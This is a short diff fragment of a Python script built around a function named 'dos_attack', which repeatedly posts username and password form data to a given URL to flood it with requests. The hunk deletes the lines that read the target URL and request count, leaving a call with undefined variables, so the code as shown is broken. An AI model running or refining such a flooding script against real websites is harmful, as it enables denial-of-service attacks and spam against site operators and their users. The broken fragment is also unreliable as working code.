@@ -17,6 +17,4 @@ def dos_attack(url, requests_count):
         payload = {'username': name, 'password': pas}
         requests.post(url, data=payload)
         
-url = input("Enter url: ")
-request_count = int(input("Enter request count: "))
 dos_attack(url, request_count) 
